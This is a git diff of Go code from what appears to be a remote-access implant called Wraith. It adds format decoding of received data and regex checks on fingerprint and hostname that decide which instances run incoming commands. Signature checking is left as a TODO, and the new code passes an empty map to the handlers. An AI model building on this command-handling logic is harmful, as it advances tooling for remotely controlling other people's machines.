@@ -9,6 +9,7 @@ import (
 	"time"
 
 	"github.com/0x1a8510f2/wraith/comms"
+	"github.com/0x1a8510f2/wraith/comms/translator"
 	"github.com/0x1a8510f2/wraith/config"
 	"github.com/0x1a8510f2/wraith/hooks"
 
@@ -93,21 +94,63 @@ func main() {
 	for {
 		// TODO: Find what is concurrent and what is not to catch points where Wraith can break/stall
 		select {
-		case data := <-comms.UnifiedRxQueue:
-			// When data is received, some details should be verified to avoid processing data which should not be processed:
+		case rx := <-comms.UnifiedRxQueue:
+			// Attempt to translate data from any known format to a map[string]interface{}
+			data, err := translator.DecodeGuess(rx.Data)
+			if err != nil {
+				// The data failed to decode (most likely didn't match any known format) so it should be discarded
+				break
+			}
+
+			// Data should now be a map[string]interface{}
+			// Some data should be verified to avoid processing data which should not be processed:
+
 			// TODO: Check if data is signed
-			// Check if the data has validity constraints
-			if validity, ok := data.Data["w.validity"]; ok {
+
+			// Check if the data has validity constraints and if they are satisfied
+			if validity, ok := data["w.validity"]; ok {
 				if validity, ok := validity.(map[string]string); ok {
 					// Enforce validity constraints
-					// Host ID
-					if constraint, ok := validity["hostFingerprint"]; ok {
-						regexp.Match(constraint, []byte{}) // TODO
+
+					// Wraith Fingerprint/ID restriction
+					if constraint, ok := validity["wfp"]; ok {
+						// Always fail if an ID restriction is present and Wraith has not been given an ID
+						if config.Config.Wraith.Fingerprint == "" {
+							break
+						}
+						match, err := regexp.Match(constraint, []byte(config.Config.Wraith.Fingerprint))
+						if !match || err != nil {
+							// If the constraint was not satisfied, the data should be dropped
+							// If there was an error in checking the match, Wraith will fallback to fail
+							// as to avoid running erroneous commands on every Wraith.
+							break
+						}
+					}
+
+					// Host Fingerprint/ID restriction
+					if constraint, ok := validity["hfp"]; ok {
+						match, err := regexp.Match(constraint, []byte{}) // TODO
+						if !match || err != nil {
+							break
+						}
+					}
+
+					// Hostname restriction
+					if constraint, ok := validity["hnme"]; ok {
+						hostname, err := os.Hostname()
+						if err != nil {
+							// Always fail if hostname could not be checked
+							break
+						}
+						match, err := regexp.Match(constraint, []byte(hostname))
+						if !match || err != nil {
+							break
+						}
 					}
 				}
 			}
 			// When data is received, run the OnRx handlers
-			hooks.RunOnRx(data.Data)
+			hooks.RunOnRx(map[string]interface{}{})
 		case <-exitTrigger:
 			return
 		}
